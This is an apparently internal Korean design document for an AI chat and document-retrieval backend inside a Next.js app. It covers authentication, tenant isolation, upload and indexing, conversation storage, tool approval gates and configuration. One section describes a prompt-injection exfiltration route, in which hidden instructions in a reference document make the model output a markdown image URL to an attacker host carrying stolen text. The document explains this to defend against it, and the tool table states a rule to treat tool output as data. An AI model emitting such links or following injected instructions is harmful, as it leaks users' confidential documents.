# AI 서버 — FE 안의 대화·검색 백엔드

AI 대화의 서버 절반(모델 호출 · 소스 문서 업로드 · RAG 검색 · 스트리밍)은 **FE(Next.js) 안의 Route
Handler** 가 맡는다. BE(Spring)는 인증 판정과 업무 데이터의 원장으로 남는다. 2026-09-07 결정.

대상 코드
- `FE/app/ai/**` — 라우트 (`/ai/chat`, `/ai/sources`, `/ai/sources/[id]`, `/ai/conversations`, `/ai/conversations/[id]`, `/ai/conversations/[id]/messages/[seq]`)
- `FE/lib/ai/server/**` — 인증 · DB · 스토리지 · 추출 · 색인 · 검색 · 모델 호출 · 대화 저장(`conversations.ts`) · 도구 안전장치(`tools.ts`)
- `BE/.../user/introspection/**` — `POST /api/auth/introspect`
- `BE/src/main/resources/db/migration/tenant/V3__ai_sources.sql`, `tenant/V4__ai_conversations.sql`, `tenant/V5__ai_source_module.sql`, `shared/V15__pgvector.sql`
- `INFRA/docker-compose.yml`(frontend 환경 변수), `docker-compose.db.yml`(pgvector 이미지), `nginx/default.conf.template`

---

## 왜 FE 안에 두는가

- 화면이 이미 AI SDK(`useChat`)와 UI Message Stream 프로토콜로 완성돼 있다. 서버를 Next 에 두면 그 프로토콜을
  다시 구현할 일이 없다. Spring 으로 가면 Java 로 같은 와이어 포맷을 다시 만들어야 한다.
- nginx 가 `/ai/` 를 이미 FE 로 보내고 SSE 설정(`proxy_buffering off`, 300초)도 그 블록에 있다.
- 임베딩·OCR 은 로컬 연산이 아니라 외부 API 호출이라 Node 와 Python 의 차이가 없다. 문서 파싱(pdf·docx·xlsx)은
  Node 라이브러리로 충분하다.
- 서버가 한 대(2vCPU/8GB)라 런타임을 하나 더 띄우지 않는 편이 낫다. 부하가 커지면 `app/ai/*` 만 별도 Next
  인스턴스로 떼어내고 nginx `/ai/` 의 upstream 만 바꾸면 된다(`NEXT_PUBLIC_AI_API_BASE`).

## 경계

| 역할 | 어디 |
| --- | --- |
| 토큰 판정(세션·소속 확인) | BE `POST /api/auth/introspect` |
| 모델 호출 · 스트리밍 | FE `app/ai/chat` → `lib/ai/server/chat-llm.ts` |
| 소스 문서 본문 | 네이버 클라우드 Object Storage (비공개 버킷) |
| 소스 메타 · 조각 · 임베딩 | **회사별 테넌트 스키마** `ai_source_docs` · `ai_source_chunks` |
| 테이블 DDL | Flyway 테넌트 마이그레이션 (Spring 이 돌리고, Next 는 읽고 쓰기만) |
| 대화 기록 · 메시지 | **회사별 테넌트 스키마** `ai_conversations` · `ai_messages` (2026-09-07 추가) |
| 도구 호출 감사 | **회사별 테넌트 스키마** `ai_tool_audit` |

---

## DB 최소 권한 — AI 서버는 `axcore_ai` 역할로 붙는다

shared V16 이 `axcore_ai` 역할과 `shared.set_ai_role_password(text)` 를 만들고, 테넌트 V6 이 회사마다 `ai_*` 다섯 테이블과
시퀀스에만 SELECT/INSERT/UPDATE/DELETE 를 준다. 비밀번호는 저장소에 없고 BE 가 부팅 때 `AI_DB_PASSWORD` 로 함수를 불러 설정한다
(`AiDbRoleOnBoot`). Next 프로세스가 침해돼도 `shared.users` 나 다른 테이블에는 닿지 않는다. 새 `ai_` 테이블을 만들면 그
마이그레이션에서 GRANT 를 같이 준다(시퀀스는 V7 처럼 이름을 지정해 준다).

비밀번호 설정이 실패해도 값이 로그에 남지 않는다 — 함수(V17)가 `EXECUTE` 를 예외 블록으로 감싸 SQL 전문이 오류 CONTEXT 에
붙지 않게 다시 던지고, `AiDbRoleOnBoot` 는 예외 종류와 SQLSTATE 만 기록한다.

## 인증 — 모든 `/ai/*` 요청은 BE 판정을 거친다

```
브라우저 ──Bearer access──▶ Next /ai/*  ──Bearer access + X-Internal-Token──▶ Spring /api/auth/introspect
                                        ◀── { userId, schemaName, ... } ────
```

- FE 서버에 JWT 시크릿을 주지 않는다. HS256 은 대칭키라 검증할 수 있는 쪽은 발급도 할 수 있다.
- BE 는 서명·만료 외에 **세션 폐기와 소속 회수를 요청 시점 DB 로 확인**한다. 회사 기밀 문서를 여는 판정이라
  일반 API(서명만 확인)보다 엄격하다.
- `X-Internal-Token`(`AUTH_INTERNAL_TOKEN`)이 서비스 간 비밀이다. BE 와 FE 가 같은 값을 갖고, 비어 있으면
  BE 가 introspect 를 전부 거부한다(503). JWT_SECRET 과 다른 값이어야 한다.
- 판정은 FE 메모리에 최대 60초(토큰 만료가 더 짧으면 그때까지) 캐시된다. 강제 로그아웃 반영이 늦는 창은 그만큼이다.
- 스키마 이름은 introspect 응답의 `schemaName` 외의 어떤 경로로도 얻지 않는다. `withTenant` 가 형태(`^ax_[0-9]{5,}$`)를
  한 번 더 보고, `set_config('search_path', $1, true)` 로 트랜잭션 안에서만 연다 — BE `TenantSearchPath` 와 같은 규칙.

## 소스 문서 — 회사 기밀로 다룬다

- **DB**: 회사별 테넌트 스키마에만 테이블이 있다. shared 에는 pgvector 확장 설치 한 줄(V15)만 있고 데이터는 없다.
- **스토리지**: 버킷 하나, 객체 키 `<회사 스키마>/ai-sources/<사용자 id>/<문서 id>/<파일명>`. 키의 첫 마디는 항상
  요청자의 스키마다. 객체는 전부 비공개고, 열기는 인증 뒤 발급되는 **10분짜리 presigned URL** 로만 한다.
  버킷에 공개 읽기 ACL 을 주면 안 된다.
- **범위**: 지금은 "개인" 만이다. 올린 사람만 자기 문서를 검색·열람·삭제한다(`lib/ai/server/sources.ts` 의 모든
  WHERE 에 `owner_user_id = 요청자`). 팀·전사 범위는 역할 권한 모델이 정해진 뒤에 그 파일의 조건을 바꾼다.
- **분야(모듈) 제한**: 문서마다 색인 때 모델이 업무 분야(`module_slug`, 핵심 기능 8개 중 하나)를 분류해 붙인다. 검색은
  `module_slug IS NULL OR module_slug = ANY(허용 모듈)` 로 걸러, 권한 없는 분야의 문서는 조각 단계에서 빠진다. 허용 모듈은 BE
  introspect 가 `enabled_features`(회사가 켠 기능, tenant V8) · `roles.is_admin` · `role_module_grants` · `member_module_grants` 로
  계산해 준다(`ModuleAccessReader`: **회사가 끈 기능은 누구에게도 없고**, 그 안에서 관리자·서버 운영자는 전부, 개인 부여가 없으면
  역할 범위, 둘 다 있으면 교집합). 설정 › 워크스페이스 › 기능 관리에서 끈 분야는 AI 답변 범위에서도 빠진다. 분류가 안 된 문서(NULL)는
  제한 없이 잡힌다.
- **외부 전송**: 조각 임베딩과 답변 생성을 위해 문서 조각이 OpenAI API(임베딩 `text-embedding-3-small`, 생성
  `gpt-5.6-luna`)로 나간다. 스캔 PDF·이미지는 통째로 같은 모델에 보내 옮겨 적는다. 이 점은 결정 사항으로
  받아들였다(2026-09-07).

## 업로드 → 색인 → 검색

```
POST /ai/sources (multipart files[])
  검증(10개 · 20MB · pdf/png/jpg/jpeg/xlsx/docx · 파일명 정제)
  → Object Storage 저장 → ai_source_docs 행(status=indexing) → 응답 SourceDoc[]
  → after(): 내려받기 → 텍스트 추출 → 조각(≈1,000자, 겹침 150) → 임베딩(1536) → ai_source_chunks → ready | failed
```

- 추출: PDF `unpdf`(쪽 단위) · DOCX `mammoth` · XLSX `exceljs`(시트 = 쪽, 행은 ` | `) · 이미지/스캔 PDF 는 모델이 옮겨 적음.
- 임베딩: OpenAI `text-embedding-3-small`, `dimensions=1536` 고정(컬럼 `vector(1536)`). 키가 없으면 임베딩 없이
  저장하고 전문 검색(`tsvector`, `simple`)으로 찾는다 — 로컬에서 키 없이도 흐름을 볼 수 있다.
- 검색(`retrieval.ts`): 선택한 문서 이름 안에서 코사인 상위 8개, 없으면 전문 검색. 조각을 `[문서 n] 이름 · 쪽` 으로
  묶어 프롬프트에 넣고, 문서당 첫 조각을 `data-answer.sources` 스니펫으로 돌려준다.
- 같은 이름을 다시 올리면 기존 문서를 지우고 새로 만든다(화면이 문서를 이름으로 고르기 때문).

## 답변 범위 — 이 회사의, 권한 있는 분야만

- 다른 테넌트의 자료는 구조적으로 닿지 않는다(스키마 격리 · 소유자 조건 · 스토리지 키). 프롬프트가 막는 것은 모델의 일반
  지식으로 타사 얘기를 하는 것과 회사 무관 잡담이다.
- 시스템 프롬프트가 사용자의 허용 모듈 이름을 명시하고, 그 밖의 질문(회사 무관 · 타사 · 권한 없는 분야)에는 고정 문구
  (`outOfScopeMessage`)로만 답하게 한다. 회사 질문이라도 자료에 근거가 없으면 "등록된 자료에서 찾지 못했어요" 로 답하고 추측하지 않는다.
- 문서를 고르지 않아도 권한 분야의 내 문서 전체를 검색한다. 허용 모듈이 비어 있으면 모델을 부르지 않고 안내 문구만 돌려준다.
- 답변에 딸린 도구 실행 기록을 히스토리에 `[도구 기록]` 으로 덧붙인다 — 모델이 "저장했습니다" 라는 자기 문장만 보고 실행
  여부를 의심해 도구를 다시 부르던 문제를 막는다.

## 대화 — `POST /ai/chat`

- 요청 본문·응답 파트는 이전 목업과 같다(`lib/ai/ui-messages.ts`). 화면은 바뀌지 않았다.
- 대화 모델 키가 있으면 `chat-llm.ts`(모델은 `models.ts` 가 `AI_CHAT_PROVIDER` 로 고른다. 2026-09-07 결정: OpenAI
  `gpt-5.6-luna`), 없으면 `chat-mock.ts`(대본). 둘 다 인증을 먼저 거친다. 스캔 PDF·이미지 옮겨 적기도 같은 모델을 쓴다.
- 파트 순서: `data-label`(의도 파악 → 문서 검색 → 정리) → `data-trace`(검색 결과 · 스킬) → 본문 → `data-answer` → `finish`.
- 히스토리: 서버 저장본에서 최근 12턴 · 1만 6천 자 예산 안의 메시지를 모델에 넣는다(`historyForModel`). 화면은 마지막 질문 하나만 보낸다.
- 아직 없는 것: 제안 승인(`approve-proposal`) 의 실제 반영, 사내 데이터 도구, 커넥터(MCP) 도구, 긴 히스토리 요약.

---

## 대화 저장 — `POST /ai/conversations` 외

화면은 질문 전에 대화를 만들고(`POST /ai/conversations`) 그 id 로 `/ai/chat` 을 부른다. 서버는 사용자 메시지를 먼저 저장해
순번을 확정하고(`data-turn { userSeq, assistantSeq, title }` 로 알려 준다), 저장본에서 히스토리를 읽어 모델에 넣고, 답이 끝나면
AI 메시지를 `meta`(추론 문구 · 도구 행 · 출처 · 요약 · 승인 카드)와 함께 저장한다. 편집·다시 시도는 `replaceFromSeq` 로 그 순번
이후를 지우고 다시 답한다. 목록 · 조회 · 제목/선택 소스 수정 · 삭제 · 평가(`PATCH …/messages/:seq`)가 있고 전부 본인 대화만이다.

## 답변 렌더링 안전장치

- 마크다운 렌더러(`components/chat/markdown.tsx`)는 이미지를 그리지 않는다(`img` → 대체 텍스트). `![](https://공격자/x?d=…)` 가
  답변에 섞이면 브라우저가 클릭 없이 그 주소를 GET 하므로, 참고 문서에 숨긴 지시로 다른 문서 내용을 유출시키는 경로가 된다.
- `next.config.ts` 가 모든 응답에 `Content-Security-Policy: img-src 'self' data: blob: …` 를 붙여 두 번째 겹으로 막는다.

## 도구 안전장치 — `lib/ai/server/tools.ts`

모델이 부를 수 있는 도구는 전부 레지스트리를 거친다. 사내 데이터 도구·MCP 는 아직 없고, 지금 있는 것은 실행 틀이다.

| 장치 | 내용 |
| --- | --- |
| 승인 게이트 | `needsApproval` 도구는 실행하지 않고 `ai_tool_audit` 에 `proposed` 로 남긴 뒤 `data-approval` 카드를 띄운다. 사용자의 결정은 `action: tool-approval` 로 돌아오고, 서버는 **자기 기록의 입력으로** 실행한다. 결정은 `UPDATE … WHERE status = 'proposed' RETURNING` 한 문장으로 선점해 동시 요청이 와도 한 승인은 정확히 한 번만 실행된다 |
| 호출 횟수 | 턴당 `MAX_TOOL_STEPS`(6) 단계 (`stopWhen`) |
| 시간 | 도구별 `timeoutMs`(기본 15초), 턴 전체 240초(nginx 300초보다 짧게) |
| 크기 | 도구 출력 4,000자에서 잘라 모델에 준다. 감사 기록에는 앞 500자만 |
| 감사 | 모든 호출이 `ai_tool_audit` 에 남는다(누가 · 언제 · 어느 도구 · 입력 · 결과 앞부분 · 소요 · 승인 결정). 대화를 지워도 남는다 |
| 프롬프트 | 도구 출력은 데이터로 취급하고 안의 지시를 따르지 않도록, `approval_required` 는 실행된 것이 아니라고 시스템 프롬프트에 명시 |

`AI_DEMO_TOOLS=1` 이면 부작용 없는 데모 도구 둘(`now`: 승인 불필요, `draft_note`: 승인 필요)이 켜진다. 안전장치가 화면까지
이어지는지 확인하는 용도라 운영에서는 켜지 않는다.

## 환경 변수

frontend 컨테이너(`docker-compose.yml`)에 들어가는 값. 로컬은 `FE/.env.local` 에 같은 이름으로 둔다. 전부 서버 전용이다.

| 변수 | 뜻 | 기본값 |
| --- | --- | --- |
| `AI_BE_BASE_URL` | introspect 를 물을 BE 주소 | `http://localhost:8080` (compose 는 `http://app:8080`) |
| `AUTH_INTERNAL_TOKEN` | 서비스 간 비밀. BE 와 같은 값 | 없음 — 필수 |
| `PGHOST` `PGPORT` `PGDATABASE` | 테넌트 스키마 접근 (`pg` 표준) | 없음 — 필수 |
| `PGUSER` `PGPASSWORD` | **AI 전용 역할** `axcore_ai`(`AI_DB_USER`) 와 `AI_DB_PASSWORD`. 슈퍼유저를 쓰지 않는다 | 없음 — 필수 |
| `NCP_OBJECT_STORAGE_BUCKET` | 비공개 버킷 이름 | 없음 — 필수 |
| `NCP_ACCESS_KEY` `NCP_SECRET_KEY` | 네이버 클라우드 API 인증키 | 없음 — 필수 |
| `NCP_OBJECT_STORAGE_ENDPOINT` | | `https://kr.object.ncloudstorage.com` |
| `NCP_OBJECT_STORAGE_REGION` | | `kr-standard` |
| `AI_CHAT_PROVIDER` | 대화·옮겨 적기 모델 프로바이더 `openai` \| `anthropic`. 비면 키 있는 쪽 | `openai` (compose 기본) |
| `AI_CHAT_MODEL` | 프로바이더 기본값: openai `gpt-5.6-luna`, anthropic `claude-opus-5` | 프로바이더별 기본값 |
| `OPENAI_API_KEY` | 임베딩(항상) + `AI_CHAT_PROVIDER=openai` 일 때 대화. 없으면 임베딩 없이 전문 검색 | 없음 |
| `ANTHROPIC_API_KEY` | `AI_CHAT_PROVIDER=anthropic` 일 때 대화 | 없음 |
| `AI_EMBEDDING_MODEL` | text-embedding-3 계열 | `text-embedding-3-small` |
| `AI_PG_POOL_MAX` | Next 쪽 커넥션 풀 | `5` |
| `AI_DEMO_TOOLS` | `1` 이면 데모 도구 켜짐(개발 전용) | 꺼짐 |

BE(app 컨테이너)에는 `AUTH_INTERNAL_TOKEN` 과 `AI_DB_PASSWORD`(부팅 때 `axcore_ai` 역할 비밀번호를 맞춘다) 가 추가된다. `INFRA/.env` 에 `AUTH_INTERNAL_TOKEN`, `NCP_*`,
`ANTHROPIC_API_KEY`, `OPENAI_API_KEY` 를 추가해야 한다(값은 이 저장소에 적지 않는다).

## 배포 시 할 일

1. `INFRA/.env` 에 위 변수 추가. `AUTH_INTERNAL_TOKEN` 은 32바이트 이상 무작위 값.
2. DB 이미지를 `pgvector/pgvector:pg18` 로 다시 띄운다(볼륨은 그대로) — Jenkins 를 한 번 `BUILD_MODE=APP_WITH_DB` 로 돌리면
   compose 가 새 이미지로 컨테이너를 다시 만든다. BE 부팅 때 shared V15 가 확장을 만든다.
3. 기존 회사 스키마의 테넌트 V3·V4·V5 는 BE 부팅 뒤 자동 적용된다(`TENANT_MIGRATE_ON_BOOT=true`, compose 기본값). 실패한 회사가
   로그에 남으면 운영자 계정으로 `POST /api/admin/workspaces/migrate` 를 다시 부른다.
4. 네이버 클라우드 콘솔에서 비공개 버킷을 만들고 API 인증키를 발급한다.
5. FE 이미지를 다시 빌드한다(의존성이 늘었다).

## 남은 일

- (완료 2026-09-07) 대화 영속화 — 서버 저장, 히스토리 주입, localStorage 제거.
- 긴 대화의 앞부분 요약(지금은 예산을 넘는 앞부분을 그냥 버린다).
- (완료 2026-09-07) 색인 상태 polling — 색인 중 문서가 있을 때 2초마다 목록을 받아 갱신한다.
- 제안 승인(`approve-proposal`) 을 업무 모듈 API 에 연결.
- 사내 데이터 도구(Spring 내부 API 호출) · 커넥터 OAuth + MCP — 레지스트리(`tools.ts`)에 등록하면 안전장치가 그대로 적용된다.
- 팀·전사 범위, 스킬 저장소, 문서 분야 태그 수동 수정 UI, 권한 부여 화면(지금은 grants 테이블이 비어 있어 관리자 외에는 분야가 없다).
